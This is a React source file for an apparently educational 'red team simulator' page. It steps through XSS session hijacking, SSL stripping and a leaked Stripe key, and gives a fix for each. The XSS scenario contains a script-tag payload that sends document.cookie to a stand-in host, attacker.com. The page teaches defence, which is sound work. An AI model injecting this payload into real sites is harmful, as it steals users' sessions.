import { useState } from 'react';
import { NodeTracerLine } from '../components/HumanIllustrations';

export default function RedTeamSimulator() {
  const [activeScenario, setActiveScenario] = useState('xss');
  const [currentStep, setCurrentStep] = useState(0);

  const scenarios = {
    xss: {
      title: 'XSS Session Hijacking Attack',
      severity: 'HIGH',
      vuln: 'Missing HttpOnly Cookie Flag',
      steps: [
        { label: 'Step 1: Attacker injects malicious script tag into un-sanitized comment field.', code: `<script>fetch('https://attacker.com/steal?c=' + document.cookie)</script>` },
        { label: 'Step 2: Victim visits the page. Browser executes inline script.', code: `executing script in user browser context...` },
        { label: 'Step 3: Missing HttpOnly flag allows script to read document.cookie.', code: `stolen_cookie = "session_id=8f3a91b2c4e57890"` },
        { label: 'Step 4: Cookie sent to attacker server. Account taken over.', code: `[Attacker Log]: Account compromised as victim user!` },
      ],
      fix: `Set-Cookie: session_id=8f3a91b...; Secure; HttpOnly; SameSite=Lax`,
    },
    ssl: {
      title: 'SSL Stripping & MITM Interception',
      severity: 'MEDIUM',
      vuln: 'Missing Strict-Transport-Security (HSTS)',
      steps: [
        { label: 'Step 1: User types "http://example.com" on public coffee shop Wi-Fi.', code: `GET http://example.com/login` },
        { label: 'Step 2: Attacker proxy intercepts plain-text HTTP request.', code: `[MITM Proxy]: Intercepted HTTP connection.` },
        { label: 'Step 3: Attacker strips HTTPS redirect and keeps victim on plain HTTP.', code: `Serving plain HTTP replica to victim.` },
        { label: 'Step 4: Victim submits password over unencrypted HTTP. Password captured.', code: `[Captured Credentials]: email=dev@app.com & password=Secret123!` },
      ],
      fix: `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`,
    },
    secret: {
      title: 'Hardcoded API Key Leak in Git',
      severity: 'CRITICAL',
      vuln: 'Exposed AWS/Stripe Secret in Frontend Bundle',
      steps: [
        { label: 'Step 1: Developer commits API key to public repository file.', code: `const STRIPE_SECRET = "sk_live_51M0...9xZ";` },
        { label: 'Step 2: Automated bot scans GitHub public stream within 10 seconds.', code: `[Bot Alert]: Matched Stripe Secret Key Pattern.` },
        { label: 'Step 3: Bot executes unauthorized API charges using leaked secret key.', code: `POST /v1/charges -> $10,000 fraudulent transaction.` },
      ],
      fix: `Move secret to environment variable (.env) and access strictly on backend server.`,
    },
  };

  const current = scenarios[activeScenario];

  return (
    <div style={{ padding: '2.5rem 0' }}>
      <div className="container--wide">
        
        {/* Header */}
        <div style={{ marginBottom: '2rem' }}>
          <div className="code-tag code-tag--accent" style={{ marginBottom: '0.4rem' }}>
            ✦ // interactive_exploit_playground
          </div>
          <h1 className="gradient-text" style={{ fontSize: '2.25rem', marginBottom: '0.4rem' }}>
            &lt;red_team_simulator/&gt;
          </h1>
          <p style={{ color: 'var(--text-secondary)', fontSize: '0.9rem', maxWidth: '680px' }}>
            Simulate real-world attack vectors step-by-step to understand *why* findings matters and how attackers exploit them.
          </p>
        </div>

        {/* Scenario Selectors */}
        <div style={{ display: 'flex', gap: '0.5rem', marginBottom: '2rem', flexWrap: 'wrap' }}>
          {Object.keys(scenarios).map((key) => (
            <button
              key={key}
              type="button"
              className={`btn ${activeScenario === key ? 'btn-primary' : 'btn-ghost'}`}
              onClick={() => { setActiveScenario(key); setCurrentStep(0); }}
            >
              {scenarios[key].title}
            </button>
          ))}
        </div>

        <NodeTracerLine label={`// simulation.${activeScenario}`} />

        {/* Active Simulation Player */}
        <div className="glass-card" style={{ padding: '2rem' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1.25rem', flexWrap: 'wrap', gap: '0.5rem' }}>
            <div>
              <span className={`badge ${current.severity === 'CRITICAL' ? 'badge-critical' : current.severity === 'HIGH' ? 'badge-high' : 'badge-medium'}`} style={{ marginRight: '0.6rem' }}>
                {current.severity} VULNERABILITY
              </span>
              <span style={{ fontSize: '0.85rem', color: 'var(--text-secondary)' }}>{current.vuln}</span>
            </div>
            <div style={{ display: 'flex', gap: '0.5rem' }}>
              <button
                type="button"
                className="btn btn-ghost"
                disabled={currentStep === 0}
                onClick={() => setCurrentStep(Math.max(0, currentStep - 1))}
              >
                &lt;- Previous Step
              </button>
              <button
                type="button"
                className="btn btn-primary"
                disabled={currentStep === current.steps.length - 1}
                onClick={() => setCurrentStep(Math.min(current.steps.length - 1, currentStep + 1))}
              >
                Next Step -&gt;
              </button>
            </div>
          </div>

          {/* Progress Bar */}
          <div style={{ background: 'var(--bg-base)', height: '6px', borderRadius: '3px', marginBottom: '1.5rem', overflow: 'hidden' }}>
            <div
              style={{
                width: `${((currentStep + 1) / current.steps.length) * 100}%`,
                height: '100%',
                background: 'var(--accent)',
                transition: 'width 0.3s ease',
              }}
            />
          </div>

          {/* Current Step Box */}
          <div style={{ background: 'var(--bg-base)', border: '1px solid var(--border-panel)', padding: '1.5rem', borderRadius: 'var(--radius)', marginBottom: '1.5rem' }}>
            <div style={{ fontSize: '0.78rem', color: 'var(--accent)', fontFamily: "'JetBrains Mono', monospace", marginBottom: '0.5rem' }}>
              STEP {currentStep + 1} OF {current.steps.length}
            </div>
            <h3 style={{ fontSize: '1.05rem', color: 'var(--text-primary)', marginBottom: '1rem' }}>
              {current.steps[currentStep].label}
            </h3>
            <pre className="finding-card__code" style={{ background: '#000', padding: '1rem', borderRadius: 'var(--radius)' }}>
              {current.steps[currentStep].code}
            </pre>
          </div>

          {/* Remediation Recipe */}
          <div style={{ background: 'rgba(0, 242, 254, 0.05)', border: '1px solid rgba(0, 242, 254, 0.2)', padding: '1.25rem', borderRadius: 'var(--radius)' }}>
            <div style={{ fontSize: '0.8rem', color: 'var(--cyan)', fontWeight: 700, marginBottom: '0.3rem' }}>
              ✦ REMEDIATION SHIELD
            </div>
            <div style={{ fontSize: '0.85rem', color: 'var(--text-secondary)', fontFamily: "'JetBrains Mono', monospace" }}>
              {current.fix}
            </div>
          </div>
        </div>

      </div>
    </div>
  );
}
